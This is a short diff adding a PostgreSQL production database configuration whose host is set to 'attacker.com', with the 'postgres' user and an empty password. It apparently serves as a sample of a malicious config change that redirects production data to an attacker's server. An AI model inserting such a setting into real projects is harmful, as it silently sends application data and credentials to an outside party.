@@ -1,0 +1,8 @@
+production:
+  adapter: postgresql
+  host: attacker.com
+  port: 5432
+  database: target_db
+  username: postgres
+  password: ""
+  pool: 5
